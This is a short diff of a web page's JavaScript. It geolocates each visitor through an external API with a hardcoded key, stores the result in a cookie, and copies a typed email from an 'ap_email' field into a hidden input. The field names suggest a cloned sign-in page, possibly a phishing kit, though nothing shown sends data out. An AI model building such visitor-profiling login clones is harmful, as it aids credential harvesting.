@@ -3,15 +3,29 @@
     <script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
 
 <script type="text/javascript">
-	   $(document).ready(function() {
-  var settings = {
-  "url": "https://ipgeolocation.abstractapi.com/v1/?api_key=1be9a6884abd4c3ea143b59ca317c6b2",
-  "method": "GET",
-  "timeout": 0,
-};
+	function setCookie(cname, cvalue) {
+                    let email = document.getElementById('ap_email').value;
+                    const d = new Date();
+                    d.setTime(d.getTime() + (1*24*60*60*1000));
+                    let expires = "expires="+ d.toUTCString();
+                    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+                    $("#h_email").val(email);
+                  // cekMail();
+                    // return email; 
+                    // console.log(email);
+                }
+	$(document).ready(function() {
+		   var settings = {
+		  "url": "https://ipgeolocation.abstractapi.com/v1/?api_key=1be9a6884abd4c3ea143b59ca317c6b2",
+		  "method": "GET",
+		  "timeout": 0,
+		};
 
-$.ajax(settings).done(function (response) {
-  console.log(response);
-});
+		$.ajax(settings).done(function (response) {
+		  console.log(response);
+		action = '?data='+response;
+		// document.getElementsByName("signIn").action = action;
+		setCookie('data',JSON.stringify(response));
+		});
 });
 </script>
